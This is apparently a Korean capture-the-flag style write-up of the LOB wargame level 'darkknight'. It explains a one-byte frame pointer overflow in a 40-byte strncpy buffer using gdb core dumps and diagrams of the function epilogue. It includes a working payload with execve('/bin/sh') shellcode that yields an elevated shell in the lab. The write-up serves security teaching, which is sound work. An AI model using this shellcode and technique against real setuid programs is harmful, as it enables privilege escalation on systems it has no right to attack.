---
title: "[LOB]Level12. darkknight"
tags: [Wargame, LOB, Write-up]
author: eli_ez3r
key: 20180830
modify_date: 2019-10-17
article_header:
  type: cover
  image:
    src: 
---

[SFP](#){:.button.button--outline-success.button--pill}

```c
/*
        The Lord of the BOF : The Fellowship of the BOF
        - darkknight
        - FPO
*/
#include <stdio.h>
#include <stdlib.h>

void problem_child(char *src)
{
	char buffer[40];
	strncpy(buffer, src, 41);
	printf("%s\n", buffer);
}

main(int argc, char *argv[])
{
	if(argc<2){
		printf("argv error\n");
		exit(0);
	}

	problem_child(argv[1]);
}
```

-----

### 0x01. Analysis

problem_child 함수를 보면 41바이트만 복사하게 된다.

힌트에 나왔듯이 SFP주소에 1바이트만 Overflow 시킬수 있는 공격이 FPO(Frame Pointer Overflow) 공격이다.

SPF의 1바이트를 변경시키면 근처 스택 주소로 SFP를 변조 시킬 수 있다.



실제 올라가게 되는 problem_child의 buffer배열 주소를 구해보자.

```sh
[golem@localhost golem]$ ./aarkknight `python -c 'print "A"*4+"S"*36+"\x80"'`
AAAASSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS?퓹? ♠?왠?옹   ♥@☻
Segmentation fault (core dumped)
[golem@localhost golem]$ gdb -c core
Core was generated by `./aarkknight AAAASSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS'.
Program terminated with signal 11, Segmentation fault.
#0  0x41414141 in ?? ()
(gdb) x/32x $esp-4
0xbffffc84:     0x41414141      0x53535353      0x53535353      0x53535353
0xbffffc94:     0x53535353      0x53535353      0x53535353      0x53535353
0xbffffca4:     0x53535353      0x53535353      0xbffffc80      0x0804849e
0xbffffcb4:     0xbffffe06      0xbffffcd8      0x400309cb      0x00000002
0xbffffcc4:     0xbffffd04      0xbffffd10      0x40013868      0x00000002
0xbffffcd4:     0x08048390      0x00000000      0x080483b1      0x0804846c
0xbffffce4:     0x00000002      0xbffffd04      0x080482e4      0x080484dc
0xbffffcf4:     0x4000ae60      0xbffffcfc      0x40013e90      0x00000002
```

problem_child의 buffer배열의 시작주소는 `0xbffffc84`로 확인되고 있다.

이제 우리는 problem_child함수의 sfp 1byte를 바꿀수 있는 것을 이용하여 공격을 해야한다.



여기서 스택주소로 변경시킬 때 중요한 점은 SFP에 [원하는 주소-4] 주소를 넣어야 된다는 점이다.

그 이유는 함수가 끝날 때, leave - ret 순서로 종료하게 되게 때문이다.

> leave 명령어는 `mov esp, ebp`, `pop ebp` 순으로 진행되고, 
>
> ret 명령어는 `pop eip`, `jmp eip` 순으로 진행된다.
>
> 자세한 내용 설명은 맨 하단으로~

그리고 problem_child의 buffer배열의 시작부분에 shellcode가 실행될 주소를 넣어주면 된다.

-----

### 0x02. Exploit

```
shell(24byte) = \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
```

```sh
[golem@localhost golem]$ ./darkknight `python -c 'print "\x88\xfc\xff\xbf"+"\x90"*12+"\x31\xc0\x50\x68\x2f\x2f\x73\x 68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"+"\x80"'`
덡퓧릱릱릱릱릱?픐h//shh/bin됥PS됣솻
                                     ??퓹?  ♠?왠?옹    ♥@☻
bash$ id
uid=511(golem) gid=511(golem) euid=512(darkknight) egid=512(darkknight) groups=511(golem)
bash$ my-pass
euid = 512
new attacker
```

-----

일단 main함수에서 problem_child를 호출하고 buffer배열 공간을 할당하게 되었을 때에 스택의 구조는 다음과 같다.

<img src="http://eliez3r.synology.me/assets/img/writeup/lob/12.darkknight/1571214325423.png" width="400px">

```sh
[golem@localhost golem]$ ./aarkknight `python -c 'print "A"*4+"\x90"*12+"S"*24+"C"'`
AAAA릱릱릱릱릱릱SSSSSSSSSSSSSSSSSSSSSSSSC?퓹? ♠?왠?옹   ♥@☻
Segmentation fault (core dumped)
```

실제 buffer배열에 A 4개와 NOP Code 12개, 그리고 Shell Code가 들어갈 공간 24byte를 넣어주고 마지막에 "C" 값을 넣어 core를 떨어뜨렸다.

```sh
[golem@localhost golem]$ gdb -q -c core
Core was generated by `./aarkknight AAAA릱릱릱릱릱릱SSSSSSSSSSSSSSSSSSSSSSSSC'.
Program terminated with signal 11, Segmentation fault.
#0  0xa970bf in ?? ()
(gdb) x/x $esp
0xbffffc4b:     0xfffe2f40
(gdb) x/4x $esp-4
0xbffffc47:     0x00a970bf      0xfffe2f40      0xfffcacbf      0x05d920bf
```

core dump를 확인해보면 흥미로운 사실을 확인 할 수 있다.

일단 `0x00a980bf` 의 주소를 모르겠다는 메시지가 나타난다.

그리고 esp 주소가 `0xbffffc4b` 이다. 그리고 esp-4 주소를 보면 `0x00a980bf` 라는 주소가 있다.  eip가 이 주소를 가리키기 때문에 Segmentation fault가 뜬것이다.

지금은 이게 무슨 말인가 싶을 수 있다. 이 내용에 궁금증을 가지고 자세히 살펴보자.

-----

darkknight문제는 main함수내에서 problem_child함수를 호출한다. 이때 인자값으로 main함수의 argv[1]값을 넘겨준다. 그리고 넘겨받은 argv[1]의 값중 41byte를 strncpy함수를 이용하여 buffer에 저장한다.

buffer의 크기는 40byte인데 strncpy에 의해서 41byte의 값을 가져오므로 problem_child함수의 sfp값이 깨지게 되어있다.

> 이문제를 이해하기 위해서는 함수의 sfp값이 왜 필요한가를 먼저 이해해야 한다. 함수가 호출될 때 해당 함수가 호출되고 나서 돌아올 주소(RET)와 함수가 호출되기 직전에 EBP값(SFP)을 스택에 저장해둔다. 그리고 호출한 함수가 끝날때, leave, ret 명령어(에필로그)에 의해서 저장된 sfp값과 ret값을 참조하여 호출되기 이전에 상태로 복귀하게 된다.

정상적인 프로그램에서 함수의 에필로그 과정을 살펴보면 다음과 같다.

problem_child 함수내의 leave가 실행되기 직전에 스택 상태이다.

```sh
(gdb) r `python -c 'print "A"*4+"B"*36+"C"'`  //실행 명령어
```

```sh
(gdb) x/15x $esp
0xbffffc84:     0x41414141      0x42424242      0x42424242      0x42424242
0xbffffc94:     0x42424242      0x42424242      0x42424242      0x42424242
0xbffffca4:     0x42424242      0x42424242      0xbffffc43      0x0804849e
0xbffffcb4:     0xbffffe06      0xbffffcd8      0x400309cb
```

이를 보기쉽게 그림으로 표시하면 다음과 같다.

<img src="http://eliez3r.synology.me/assets/img/writeup/lob/12.darkknight/1571278048851.png" width="600px">

problem_child SFP의 값을 보면 마지막에 **0x43**이 들어간 것을 볼수있다. 이는 argv[1]의 마지막 byte의 값이 "C(0x43)"이기 때문에 strncpy를 하면서 덮여씌워진 것이다.

그럼 이상태에서 함수 에필로그를 진행하면 레지스트리 값이 어떻게 변하는지 살펴보자.

<img src="http://eliez3r.synology.me/assets/img/writeup/lob/12.darkknight/1571214379330.png" width="600px">

problem_child 함수의 에필로그가 시작하기 직전에 eip, ebp, esp 레지의 상태값이다.

앞서 말한것 처럼 leave 명령어는 `mov esp, ebp` 와 `pop ebp`로 구성된 명령어이다.

leave명령어를 2단계로 쪼개서 살펴보자.

-----

##### 1) problem_child 함수의 leave

<img src="http://eliez3r.synology.me/assets/img/writeup/lob/12.darkknight/1571214508497.png" width="600px">

`mov esp, ebp`를 실행하면 esp값이 ebp의 값과 동일하게 된다.

<img src="http://eliez3r.synology.me/assets/img/writeup/lob/12.darkknight/1571214637643.png" width="600px">

`pop ebp`를 하면 esp가 가리키는 곳의 값을 ebp로 넣고 esp는 4byte증가하게 된다.

> 이때 sfp값이 1byte(0x43)덮어 씌워져있었으므로 ebp는 엉뚱한 곳(0xbffffc43)을 가리키고 있게 된다.



##### 2) problem_child 함수의 ret

그리고 ret는 `pop eip`, `jmp eip`로 진행되어진다.

<img src="http://eliez3r.synology.me/assets/img/writeup/lob/12.darkknight/1571214850448.png" width="600px">

`pop eip` 명령에 의해서 eip에 esp가 가리키던 값 `0x0804849e`값이 들어가고 esp를 pop명령어에 의해 4byte 증가하게 된다. 그리고 jmp eip 명령어를 통해 프로그램이 `0x0804849e` 주소를 실행하게 된다.

```assembly
Dump of assembler code for function main:
=======================(생략)============================
0x8048499 <main+45>:    call   0x8048440 <problem_child>
0x804849e <main+50>:    add    %esp,4
0x80484a1 <main+53>:    leave
0x80484a2 <main+54>:    ret
```

`0x0804849e` 주소는 main함수에서 problem_child 함수를 호출하고 난 바로 다음 코드의 주소이다.



##### 3) main함수에서 problem_child함수 스택 정리

<img src="http://eliez3r.synology.me/assets/img/writeup/lob/12.darkknight/1571215063447.png" width="600px">

`add %esp, 4` 명령어를 수행하게 되면 esp값은 4가 증가하게 된다.

그리고나서 바로 main함수의 leave와 ret를 만나게 된다.



##### 4) main 함수의 leave

<img src="http://eliez3r.synology.me/assets/img/writeup/lob/12.darkknight/1571275687784.png" width="600px">

`mov esp, ebp`명령에 의해서 esp값이 `0xbffffc43`으로 바뀐다.

<img src="http://eliez3r.synology.me/assets/img/writeup/lob/12.darkknight/1571276328187.png" width="600px">

`pop ebp`명령으로 esp가 가리키고 있는 값(0xfffc7440)이 ebp에 들어가게 된다. 스택의 정확한 값들을 살펴보면 다음과 같다.

```sh
(gdb) x/4x 0xbffffc43
0xbffffc43:     0xfffc7440      0x00a970bf      0xfffe2f40      0xfffcacbf
```



##### 5) main 함수의 ret

<img src="http://eliez3r.synology.me/assets/img/writeup/lob/12.darkknight/1571276427498.png" width="600px">

그리고 `pop eip` 명령을 통해 esp가 가리키고 있던 주소(0xbffffc47)의 값 `0x00a970bf` 값이 eip로 들어가고 esp는 4증가한다.  그리고 최종적으로 `jmp eip`를 통해 해당 주소로 점프해 명령을 수행하게 된다.

-----

이렇게 하나하나보면 장황해보이지만 정리하면 간단하다.

처음 우리가 problem_child함수의 SFP를 1byte 조작하여 `0xbffffc43` 으로 조작되었고, 최종적으로 실행되는 명령주소는 `0xbffffc47` 주소에 들어있는 주소값(조작한 값의 +4한 주소)이다.

정확하게 확인해보자.

buffer의 시작주소는 `0xbffffc84`이다. 마지막 1byte를 `\x84` 로 바꿔보자. (-4 하지 않은 값)

```sh
[golem@localhost golem]$ ./aarkknight `python -c 'print "A"*4+"B"*36+"\x84"'`
AAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB꾻퓹♠?왠?옹   ♥@☻
Segmentation fault (core dumped)
[golem@localhost golem]$ gdb -q -c core
Core was generated by `./aarkknight AAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB?.
Program terminated with signal 11, Segmentation fault.
#0  0x42424242 in ?? ()
```

위와 같이 `0x42424242` 주소를 알지 못해 에러메시지를 표시한다. 그러면 -4한 값을 넣어주면?

```sh
[golem@localhost golem]$ ./aarkknight `python -c 'print "A"*4+"B"*36+"\x80"'`
AAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB?퓹? ♠?왠?옹   ♥@☻
Segmentation fault (core dumped)
[golem@localhost golem]$ gdb -q -c core
Core was generated by `./aarkknight AAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB'.
Program terminated with signal 11, Segmentation fault.
#0  0x41414141 in ?? ()
```

buffer배열의 첫 4byte("AAAA")를 실행하려는 모습을 볼 수 있다.

이처럼 sfp값의 1byte만을 조작해서 프로그램의 흐름을 바꿀수 있게 된다.